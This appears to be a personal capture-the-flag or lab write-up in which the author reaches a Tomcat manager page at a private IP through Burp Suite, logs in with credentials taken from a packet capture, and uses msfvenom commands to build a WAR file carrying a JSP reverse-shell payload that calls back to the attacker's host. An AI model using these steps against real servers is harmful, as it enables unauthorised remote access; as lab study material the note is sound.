# HTTPS_M@nag3Me
## Firefox trouble
- I've got an access trouble from my firefox to this url: https://192.168.110.140:8443/_M@nag3Me/html
![[Pasted image 20210423111653.png]]
- And tried all fixing steps from online, none of them work, then one page said it could be incompatible from old tls website with new web browser, which can be solved by use proxy
- Which is BurpSuite coming; Always use Burp as Intercepter, new trick learnt, set browser proxy to Burp, and then turn off the intercept, then Burp will work as transparent proxy.
- Then this url is accessible, and we will get an login prompt, and we can use the credential get from the pcap [[20 - ImpressCMS]]
![[Pasted image 20210423112910.png]]
![[Pasted image 20210423112937.png]]

## WAR upload
- Try to make a malicious WAR which can be deploy in tomcat to get reverse shell
```bash
msfvenom -p linux/x64/shell_reverse_tcp lhost=192.168.59.60 lport=9001 -f war -o pwn.war
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of war file: 1550 bytes
Saved as: pwn.war
```
- But after select the file and click deploy, I've got permission denied
![[Pasted image 20210423120353.png]]
- Alright the reason is that tomcat use java, and I did not use the java/jsp to generate WAR
```bash
msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.110.100 lport=9001 -f war -o pwn.war
Payload size: 1102 bytes
Final size of war file: 1102 bytes
Saved as: pwn.war
```
![[Pasted image 20210423122003.png]]
- Then we will have reverse shell

